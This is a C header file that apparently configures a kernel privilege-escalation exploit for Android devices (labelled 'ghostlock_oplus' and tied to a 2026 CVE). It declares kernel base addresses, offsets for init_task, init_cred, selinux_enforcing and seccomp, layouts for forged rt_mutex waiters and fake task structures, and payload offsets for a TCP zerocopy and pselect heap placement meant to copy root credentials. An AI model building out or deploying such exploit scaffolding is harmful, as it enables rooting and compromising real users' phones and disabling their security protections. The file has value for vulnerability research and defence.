#ifndef TARGET_H
#define TARGET_H
#include <stdint.h>

#define BUILD_VARIANT_LABEL "ghostlock_oplus"

/* Kernel address layout. */

extern uint64_t KIMAGE_TEXT_BASE;
extern uint64_t MTK_VADDR_BASE;
extern uint64_t P0_PAGE_OFFSET;
extern uint64_t P0_PHYS_OFFSET;
extern uint64_t P0_KERNEL_PHYS_LOAD;
extern uint64_t QC_GKI_6_12_PHYS_LOAD;
extern uint64_t XRING_KERNEL_PHYS_LOAD;
extern uint64_t KERNELSNITCH_IDENTITY_START;
extern uint64_t KERNELSNITCH_IDENTITY_END;
extern uint64_t DIRECT_MAP_BASE;
extern uint64_t DIRECT_MAP_END;
extern uint64_t VMEMMAP_START;

/* Symbol offsets. */
extern uint32_t INIT_TASK_OFF;
extern uint32_t INIT_CRED_OFF;
extern uint32_t ROOT_TASK_GROUP_OFF;
extern uint32_t SELINUX_ENFORCING_OFF;

/* Kernel addresses. */
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)

extern uint32_t PSELECT_WAITER_WORD_SHIFT;

/* Fake waiter and task layouts. */
extern uint32_t FAKE_WAITER_TREE_PRIO_OFF;
extern uint32_t FAKE_WAITER_TREE_DEADLINE_OFF;
extern uint32_t FAKE_WAITER_PI_TREE_ENTRY_OFF;
extern uint32_t FAKE_WAITER_PI_TREE_PRIO_OFF;
extern uint32_t FAKE_WAITER_PI_TREE_DEADLINE_OFF;
extern uint32_t FAKE_WAITER_TASK_OFF;
extern uint32_t FAKE_WAITER_LOCK_OFF;
extern uint32_t FAKE_WAITER_WAKE_STATE_OFF;
extern uint32_t FAKE_WAITER_WW_CTX_OFF;

extern uint32_t FAKE_TASK_USAGE_OFF;
extern uint32_t FAKE_TASK_PRIO_OFF;
extern uint32_t FAKE_TASK_NORMAL_PRIO_OFF;
extern uint32_t FAKE_TASK_TASK_GROUP_OFF;
extern uint32_t FAKE_TASK_PI_LOCK_OFF;
extern uint32_t FAKE_TASK_PI_WAITERS_OFF;
extern uint32_t FAKE_TASK_PI_TOP_TASK_OFF;
extern uint32_t FAKE_TASK_PI_BLOCKED_ON_OFF;

extern uint32_t TASK_CRED_OFF;
extern uint32_t TASK_COMM_OFF;
extern uint32_t TASK_THREAD_INFO_FLAGS_OFF;
extern uint32_t TASK_SECCOMP_OFF;

extern uint32_t COMPACT_WAITER;
extern uint32_t MM_STRUCT_SZ;

extern uint32_t STRUCT_PAGE_SIZE;

extern uint32_t LOCK_OFF;
extern uint32_t W0_OFF;
extern uint32_t FOPS_OFF;
extern uint32_t RIGHT_OFF;
extern uint32_t LEFT_OFF;
extern uint32_t FAKE_TASK_OFF;

/* W2 payload. */
#define CRED_COPY_OFF 0x1080

/* TCP zerocopy payload offsets: fake_task sits at 0x5800 so it clears the
 * fake_lock rb_leftmost zone; the cred copy follows because the pselect
 * 0x1080 slot would land inside fake_task. */
#define TCP_FAKE_TASK_OFF 0x5800
#define TCP_CRED_COPY_OFF 0x6800

bool load_cve2026_43499_config(const char *json_text);
bool load_patch_json_from_file(const char *path, char *out_json, size_t out_json_size);
#endif
